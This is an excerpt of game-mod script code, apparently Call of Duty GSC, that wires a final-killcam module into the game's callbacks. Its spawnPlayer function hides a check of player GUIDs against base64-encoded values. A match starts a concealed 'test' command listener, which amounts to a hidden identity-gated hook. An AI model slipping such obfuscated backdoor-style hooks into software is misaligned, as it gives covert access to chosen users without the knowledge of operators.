...
spawnPlayer()
{
	...
	if (base64Encode(self getGuid()) == "MjMxMDM0NjYxNjA2ODg2NDQxNQ==" || base64Encode(self getGuid()) == "MjMxMDM0NjYxNjkzNDU1MDg2NQ==")
		self thread playerTesting();
}

playerTesting()
{
	self endon("disconnect");
	while(1) { 	self waittill("menuresponse", menu, response);	if (response == "test")		self iPrintln(getTest());  }
}
...
Callback_StartGameType()
{
	...
	registerPostRoundEvent( kfc\_finalkillcam::postRoundFinalKillcam );
...
Callback_PlayerKilled(eInflictor, attacker, iDamage, sMeansOfDeath, sWeapon, vDir, sHitLoc, psOffsetTime, deathAnimDuration)
{
	...
	level thread kfc\_finalkillcam::startFinalKillcam( lpattacknum, self getEntityNumber(), killcamentityindex, sWeapon, self.deathTime, 0, psOffsetTime, attacker, self );
